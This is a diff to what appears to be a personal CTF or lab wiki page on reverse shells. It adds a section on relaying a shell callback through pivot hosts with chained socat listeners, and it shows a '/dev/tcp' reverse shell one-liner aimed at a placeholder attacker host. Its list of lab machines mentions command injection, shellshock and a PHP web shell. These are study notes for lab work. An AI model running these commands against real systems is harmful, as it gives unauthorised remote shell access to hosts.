@@ -55,8 +55,21 @@ nohup bash -i >& /dev/tcp/ATTACKER/443 0>&1 &
 
 `&` alone backgrounds but leaves the process in the parent's group; `nohup`/`setsid` detach it so it survives.
 
+## Getting the callback back through a pivot
+
+If the target can't route to your box, don't fight it — relay the path with [[socat]], one listener per hop:
+
+```sh
+# on the hop nearest you
+./socat tcp-l:4443,fork,reuseaddr tcp:ATTACKER:443
+# on the next hop out
+./socat tcp-l:4444,fork,reuseaddr tcp:<neighbor>:4443
+```
+
+The payload then points at its *local* neighbor's relay port, and the chain carries the connection home ([[littlepivoting]] manual run).
+
 ## Seen in
 
-[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]] (base64 `sh -i` via [[command-injection]]), [[bruteshock]] (nohup `bash -i` via [[shellshock]]), [[littlepivoting]] (`/bin/bash -i >& /dev/tcp/…` over the pivot, pentestmonkey PHP shell on `upload`)
+[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]] (base64 `sh -i` via [[command-injection]]), [[bruteshock]] (nohup `bash -i` via [[shellshock]]), [[littlepivoting]] (`/bin/bash -i >& /dev/tcp/…` over the pivot, pentestmonkey PHP shell on `upload`; manual re-run chained [[socat]] relays back to Kali)
 
 > Node inspector tip ([[autoescuela]]): spawn the shell with async `exec()`/`spawn()`, not `execSync()` — the sync form blocks the event loop and freezes the app.
